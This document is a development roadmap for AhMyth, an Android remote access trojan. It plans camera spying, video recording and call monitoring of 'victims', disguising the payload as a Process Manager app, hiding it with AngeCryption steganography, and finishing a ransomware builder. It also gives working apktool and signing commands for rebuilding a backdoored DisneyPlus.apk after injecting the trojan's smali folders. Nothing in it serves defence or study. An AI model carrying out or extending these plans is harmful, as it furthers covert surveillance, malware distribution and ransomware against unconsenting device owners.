
1. Integrate Live Camera Preview for the Camera option in the Victims Lab, controlled by the  *CameraManager*  file
     
*CameraManager*  file is located @ `~/AhMyth/AhMyth-Client/app/src/main/java/ahmyth/mine/king/ahmyth/CameraManager.java`
#
2. Integrate Video Recording for the camera option in the Victims Lab
#
3. Integrate Call Notifications for Incoming and Outgoing Calls from and to the Victim
#
4. Test AhMyth payload behaviour with & without AndroidX Libraries to determine if AndroidX helps the AhMyth client run better
#
5. Re-write AhMyth payload (remove google play services theme and activity and replace with Process Manager theme)
#
6. Find a way to stop the flickering Victim's Connections with `socket.io-client v2.0.1`, currently needs to maintain `socket.io-client v0.8.3` to hold a connection without flickering back and forth with Connecting and Disconnecting with Victims
#
7. Find a way to upgrade `semantic-ui` or find an alternative, as it's causing blocks in upgrading most of AhMyth's `node_modules` which is likely the reason the AhMyth interface breaks with the default electron version provided by *npm*

Warnings + errors when running `npm install semantic-ui@latest` stopping semantic-ui from upgrading
#
8. Find out a way to have the `AppCtrl.js` file detect `RANGE ERRORS` with apktool, then create a new `smali_classes` folder inside a decompiled original APK for the storing of AhMyth files when a `RANGE ERROR` is detected with Apktool.

My research has revealed that most of the time when a `Building Failed` error arises with `java 11` & `java 8`, it is mostly because of a `RANGE ERROR` with apktool, 
which can be fixed by moving the `ahmyth, io, okhttp3 & okio` folders that are normally located inside the `smali` folder of backdoored original APK's, 
into a `smali_classes` folder, i.e something like `smali_classes2` if the directory doesn't exist already.

When testing this method the results were successful, running the following commands allowed me to manually recompile the AhMyth binded APK that had failed to build before

PS: The name of the APK was "DisneyPlus.apk"

- `cd disneyplus && mkdir smali_classes5 && cd smali && sudo mv ahmyth io okhttp3 okio /$HOME/Downloads/Disneyplus/smali_classes5`
- `/usr/bin/update-alternatives --config java`
- `0` - to switch to `java 11.0.3`
- `apktool b disneyplus -o test.apk`
- `java -jar sign.jar test.apk`

Manual building was successful with both java versions but failed to install on the victim Android Device, THIS IS GOOD!! this means I am getting closer to solving the `Building Failed` problem for AhMyth, as well as solving the problem of the payload not being installed on the victim Device. 

This problem was most likely due to the old APK signer AhMyth was using before we migrated the old APK signer to Uber-apk-signer, so I will review this problem again soon.
#
9. Find a way to add `RES_TYPE_STYLES2` plus other `RES_TYPE_STYLES` to Apktool via tweaking the settings of Apktool and building via `gradlew build shadowJar` as 
these style's are used by most APK files today, namely by `Facebook`
#
10. Find a way to successfully integrate AngeCryption into AhMyth for steganography builder
#
11. Finish the Ransomware Builder and build a new Ransomware APK of our own. 
